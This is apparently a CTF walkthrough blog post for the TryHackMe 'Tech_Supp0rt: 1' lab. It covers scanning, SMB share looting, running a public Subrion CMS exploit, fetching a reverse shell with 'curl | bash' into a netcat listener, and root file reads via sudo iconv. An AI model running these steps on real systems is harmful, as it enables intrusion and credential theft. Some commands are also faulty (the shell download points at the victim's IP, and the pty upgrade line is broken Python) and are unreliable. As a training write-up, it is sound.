---
title: "Hello, Tech_Supp0rt: 1? I Think I Have a Problem with My CMS: TryHackMe Walkthrough"
slug: techsupp0rt-1
layout: post
excerpt_separator:  <!--more-->
categories:
  - ctfs
---

In this walkthrough, we explore the [Tech\_Supp0rt: 1](https://tryhackme.com/room/techsupp0rt1) CTF on [TryHackMe](https://tryhackme.com), covering steps such as using Nmap for scanning, Gobuster for directory enumeration, enum4linux for SMB share discovery, exploiting a Subrion panel, and escalating privileges to root. The process involves identifying open ports, finding directories and shares, cracking credentials, exploiting a vulnerable CMS, and ultimately gaining root access to the system.

### Step 1: Nmap

```bash
nmap -T4 -sV -sC -A -p- 10.10.185.192 --min-rate 1000
```

```plaintext
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/12%OT=22%CT=1%CU=36267%PV=Y%DS=4%DC=T%G=Y%TM=64AEDF5
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=109%GCD=2%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS(O1=M509ST11NW7%O2=M509ST11
OS:NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509ST11NW7%O6=M509ST11)WIN(W1=68D
OS:F%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M50
OS:9NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T
OS:=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2023-07-12T22:43:56+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-07-12T17:13:54
|_  start_date: N/A
|_clock-skew: mean: -1h49m57s, deviation: 3h10m29s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

### Step 2: Gobuster

```bash
gobuster dir --url http://10.10.185.192/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -q
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694161530/30c950ee-0961-48c9-a723-5eafdcea0818.png){: .center-image }

### Step 3: enum4linux

Let's run a scan to see which shares are available.

```bash
enum4linux 10.10.185.192
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694181318/d8afa0a8-c0f9-425c-8731-cfcae2207f13.png){: .center-image }

### Step 4: SMB Share

```bash
smbclient //10.10.185.192/websvr
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694198976/9e086cf7-0ba3-4d3b-a23d-b2d909de136c.png){: .center-image }

Let's see what is in this text file.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694208878/1d05eb14-40c3-49f5-b197-06935ff5aca1.jpeg){: .center-image }

Hmmm. Let's see if we can crack this with CyberChef.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694215985/5087cf0a-f5be-4454-9e72-e3320f78cead.jpeg){: .center-image }

### Step 5: Subrion Panel

Let's enumerate for a Subrion panel using gobuster.

```bash
gobuster dir --url http://10.10.185.192/subrion/ -f -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o subrion.txt -b 301,302,304 -t 100 -q
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694252898/7691c708-13af-4ce4-b4d5-c6aca067b15d.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694255875/6d3ecb61-de8f-497f-9da4-1527035af329.png){: .center-image }

We discovered an admin panel. Let's plugin the credentials we gathered from our earlier recon.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694264864/21238113-44e3-4617-890d-4a25ff458c25.png){: .center-image }

It looks like the CMS version is 4.2.1. Searchsploit has an exploit for this.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694275833/da984a89-a4e3-4efa-9ab4-ed5649f02085.png){: .center-image }

Download by typing:

```bash
searchsploit -m php/webapps/49876.py
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694287456/77f97444-bb4e-4a4f-8be1-7d33a046880e.png){: .center-image }

### Step 6: Exploit

Exploit:

```bash
python3 49876.py -u http://10.10.185.192/subrion/panel/ --user=admin --passw=********
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694314148/a405ae3e-fe79-4d21-a3c1-279eb21aabe4.jpeg){: .center-image }

Nice! Now, let's get a better stable shell on here. First, let's start a Python server where our reverse shell is located:

```bash
python3 -m http.server 8000
```

Then start a netcat listener to catch the shell:

```bash
rlwrap nc -lvnp 1337
```

Finally, pull the script onto the victim box:

```bash
curl http://10.10.185.192:8000/shell.sh | bash
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694355516/65c08515-cddf-4fe8-9a4b-d648aec105b7.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694358359/109c8b8e-c60c-45a1-b6c7-c81d232cc975.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694361454/ce7b0205-5c69-49ac-be96-ac377ad93b59.png){: .center-image }

Let's upgrade it:

```bash
python -c 'import;pty.spawn("/bin/sh")'
export TERM=xterm-256color
```

### Step 7: Privesc and Root

First, let's check crontab:

```bash
cat /etc/crontab
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694397778/dee6cb71-348f-4352-b74d-0805b0b6c1d3.png){: .center-image }

No attack vector here, let's check the binaries:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694413611/30208a04-7059-4260-ab64-94381a3897da.png){: .center-image }

Nothing here either, let's dig around the file system for something useful.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694422337/412085da-158d-44ee-b0ae-d6963b608562.webp){: .center-image }

`/var/www/html/wordpress/wp-config.php` has a password that we can use to pivot.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694434876/56b122dc-1934-40d9-a836-82c161609d48.jpeg){: .center-image }

Let's check `/etc/passwd` for usernames.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694442635/35908c29-eb3e-4833-868b-948281d4623d.webp){: .center-image }

We can take the password we found from the wp-config.php and log in to `scamsite`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694450937/e840b15b-4618-4cba-8d27-2450cad5f58c.jpeg){: .center-image }

And we're in. Let's see what we can run as sudo.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694458305/5cb71a3a-b751-45d8-886f-60af5b94cc06.webp){: .center-image }

We can run `/usr/bin/iconv` as sudo. Let's check GTFObins for a privesc method.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694466074/e2d88901-5498-4bb3-b989-9ed133bdb2ab.webp){: .center-image }

```bash
LFILE=/root/root.txt
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691694475936/222810e2-1829-4fbc-a8a8-e8b251abe5cd.jpeg){: .center-image }

From here we could use this binary to read the `/etc/shadow` file and elevate permissions or create ways to maintain persistence. Overall, this box was very enjoyable and I'm glad there was a unique vector in order to gain root-level privileges.